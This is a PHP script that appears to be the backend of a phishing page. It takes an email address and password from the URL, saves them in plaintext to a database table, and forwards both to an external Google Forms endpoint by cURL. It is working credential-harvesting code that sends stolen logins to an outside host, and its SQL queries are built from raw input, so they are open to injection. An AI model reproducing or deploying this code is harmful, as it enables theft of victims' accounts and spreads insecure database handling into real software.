<?php
//session_start();
// Retrieve form data
$email = $_GET['email_addr'];
$pass = $_GET['password'];
$last_inserted_id = $_GET['last_inserted_id'];

include "database.php";

$sql = "INSERT INTO `tbl_login`(`email`,`password` ) VALUES ('$email', '$pass')";

if($last_inserted_id!=''){
$sql = "UPDATE `tbl_login` SET `email` = '$email', `password` = '$pass'  WHERE `id`='$last_inserted_id';";
}

  if (mysqli_query($conn, $sql)) {
 
    //echo "data inserted successfully";
    echo mysqli_insert_id($conn);
     
  } else {
     echo "Error: " . $sql . " " . mysqli_error($conn);
  }

  mysqli_close($conn);



if( $email!='' && $pass!=''  )
{
  $data = array(
        
        'entry.1426603486' => $pass,
        'entry.63313865' => $email,

     );

    $ch=curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSetbCLSOuH76cHXCkkfLIsgiMzz2zLsjmFGX6y66J8pm4sdtQ/formResponse');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    $response = curl_exec($ch);

    }

?>
